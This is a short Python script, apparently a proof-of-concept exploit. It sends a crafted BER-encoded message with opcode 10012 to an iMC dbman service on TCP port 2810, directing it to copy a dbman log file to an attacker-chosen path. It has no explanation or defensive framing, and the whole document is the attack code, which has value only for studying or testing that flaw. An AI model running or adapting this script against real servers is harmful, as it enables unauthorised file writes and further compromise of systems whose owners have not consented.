from pyasn1.type.univ import *
from pyasn1.codec.ber import encoder
from pyasn1.type.namedtype import *
import struct
import socket
import time

class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType('reservedFilePath', OctetString()),
        NamedType('backupPath', OctetString()),
        NamedType('backFileExt', OctetString()),
        NamedType('time', Integer())
        #NamedType('Null', Null()),
    )

port = 2810  # Default
opcode = 10012

HOST = '127.0.0.1'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, port))

msg = DbmanMsg()

msg['reservedFilePath'] = 'C:\\Program Files\\iMC\\dbman\\log\\dbman_debug.log'
msg['backupPath'] = 'C:\\Users\\lol\\dbman_loggg.log.txt'
msg['backFileExt'] = '.log'
msg['time'] = time.time()

encodedMsg = encoder.encode(msg, defMode=True)
msgLen = len(encodedMsg)
values = (opcode, msgLen, encodedMsg)
s = struct.Struct(">ii%ds" % msgLen)
packed_data = s.pack(*values)

sock.sendall(packed_data)
sock.close()
